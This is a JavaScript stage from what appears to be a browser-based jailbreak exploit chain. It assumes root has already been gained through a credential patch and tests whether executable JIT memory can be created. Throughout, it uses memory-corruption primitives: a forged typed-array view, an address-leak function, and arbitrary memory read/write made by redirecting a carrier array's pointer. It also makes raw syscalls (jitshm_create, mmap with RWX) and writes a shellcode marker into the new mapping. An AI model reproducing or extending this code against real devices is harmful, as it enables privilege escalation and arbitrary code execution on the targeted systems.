// Stage JIT v1: re-test the executable-page path now that uid=0.
//
// Before the ucred patch jitshm_create returned EPERM. Hx1400's Stage I does:
//   fd = jitshm_create(0, 16384, 7)
//   p  = mmap(0x940900000, 16384, 7, 17, fd, 0)   // 17 = MAP_FIXED|MAP_SHARED
// and, if the fixed map is refused, mmap(NULL, ...). This probe repeats that
// shape, then reads back the first bytes and reports the mapping.
//
// It uses the plain native caller: no ROP, no setsockopt, no rotation.
var result, n, f, dv, saved, phase = "preflight";
var forged = null, carrier = null, carrierSlot = -1, carrierOriginal = null;
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
      !state || state.array[0] !== state.a || !state.view ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !Number.isInteger(state.index))
    throw new Error("caller_missing");
  var need = ["sys24", "sys477", "sys533", "getpid"];
  for (var mi = 0; mi < need.length; mi++)
    if (typeof n.wrappers[need[mi]] !== "number")
      throw new Error("wrappers_missing_" + need[mi]);
  f = n.frame;
  if (f.length < 0x9020) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);
  saved = Array.from(f.subarray(0x200, 0x1000));

  forged = state.view;
  carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  function bytesAt(index, count) {
    var out = [];
    for (var i = 0; i < count; i++) out.push(forged[index + i]);
    return out;
  }
  function valueOf(bytes) {
    var v = 0;
    for (var i = bytes.length - 1; i >= 0; i--) v = v * 256 + bytes[i];
    return v;
  }
  function pointerBytes(value) {
    var out = [];
    for (var i = 0; i < 8; i++)
      out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  carrierSlot = addressOf(carrier) - base + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  carrierOriginal = bytesAt(carrierSlot, 8);
  function setCarrier(addr) {
    var next = pointerBytes(addr);
    for (var i = 0; i < 8; i++) forged[carrierSlot + i] = next[i];
  }
  function restoreCarrier() {
    for (var i = 0; i < 8; i++)
      forged[carrierSlot + i] = carrierOriginal[i];
  }
  function poke(addr, bytes) {
    setCarrier(addr);
    for (var i = 0; i < bytes.length; i++) carrier[i] = bytes[i];
    restoreCarrier();
  }
  function peek(addr, count) {
    setCarrier(addr);
    var out = [];
    for (var i = 0; i < count; i++) out.push(carrier[i]);
    restoreCarrier();
    return out;
  }
  function isErr(r) {
    return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
  }
  function eTag(r) {
    if (!isErr(r)) return "v" + r.value;
    var e = n.readErrno();
    return "e" + (e === null ? r.value : e);
  }
  function hex8(v) { return ("00000000" + (v >>> 0).toString(16)).slice(-8); }
  function hex64(v) {
    return ("0000000000000000" + Math.floor(v).toString(16)).slice(-16);
  }
  function mark(m) {
    if (typeof api !== "undefined" && api && typeof api.markSync === "function")
      api.markSync(m);
  }

  var pidRes = n.call("getpid", []);
  var pid = pidRes.value;

  // ------------------------------------------------------- getuid
  phase = "uid";
  mark("jit_uid");
  var uidRes = n.call("sys24", []);
  var uidTag = eTag(uidRes);

  // ------------------------------------------------ jitshm_create
  phase = "create";
  mark("jit_create");
  var jRes = n.call("sys533", [0, 16384, 7]);
  var createTag = eTag(jRes);

  // ------------------------------------------------------ mmap
  var mapTag = "-", mapAddr = -1, readTag = "-";
  var jd = jRes.value;
  if (!isErr(jRes) && jd >= 0) {
    phase = "mmap_fixed";
    mark("jit_mmap_fixed");
    var mRes = n.call("sys477", [0x940900000, 16384, 7, 17, jd, 0]);
    if (isErr(mRes) || mRes.value <= 0) {
      phase = "mmap_float";
      mark("jit_mmap_float");
      mRes = n.call("sys477", [0, 16384, 7, 17, jd, 0]);
    }
    mapTag = eTag(mRes);
    if (!isErr(mRes) && mRes.value > 0) {
      // The caller returns a 64-bit result as {value, high}: reconstruct it.
      // The reference maps at 0x940900000, whose low dword is 0x40900000, so
      // `value >>> 0` alone would write to the wrong address.
      mapAddr = (mRes.high >>> 0) * 0x100000000 + (mRes.value >>> 0);
      // write a marker and read it back
      phase = "rwx";
      mark("jit_rwx");
      try {
        poke(mapAddr, [0x90, 0x90, 0x90, 0xc3, 0x41, 0x42, 0x43, 0x44]);
        var got = peek(mapAddr, 8);
        readTag = got.join(",");
      } catch (rwErr) {
        readTag = "rw_err_" + String(rwErr).slice(0, 40);
      }
    }
  }

  // ------------------------------------------------------- outcome
  phase = "outcome";
  for (var ri = 0; ri < saved.length; ri++) f[0x200 + ri] = saved[ri];
  saved = null;
  var post = n.call("getpid", []);
  var intact = post.value === pid && post.high === 0 &&
    state.array[0] === state.a &&
    bytesAt(carrierSlot, 8).join(",") === carrierOriginal.join(",");

  window.__fw14StageJit = {
    uid: isErr(uidRes) ? null : uidRes.value,
    handle: (!isErr(jRes) && jd >= 0) ? jd : null,
    addr: mapAddr > 0 ? mapAddr : null,
    pid: pid
  };
  result = {
    id: "stage_jit_v1",
    status: (uidTag === "v0" && mapAddr > 0 && intact) ? "pass" : "fail",
    details: {
      pid: pid,
      uid: uidTag,
      create: createTag,
      mmap: mapTag,
      addr: mapAddr > 0 ? "0x" + hex64(mapAddr) : "none",
      read: readTag.slice(0, 120),
      state: mapAddr > 0 ? "rwx" : "noexec",
      intact: intact
    }
  };
} catch (e) {
  result = {
    id: "stage_jit_v1",
    status: "error",
    details: { phase: phase, error: String(e).slice(0, 220) }
  };
} finally {
  try { if (forged && carrierSlot >= 0 && carrierOriginal)
    for (var ci = 0; ci < 8; ci++)
      forged[carrierSlot + ci] = carrierOriginal[ci]; } catch (ignore) {}
  if (f && saved)
    for (var fi = 0; fi < saved.length; fi++) f[0x200 + fi] = saved[fi];
}
return [result];
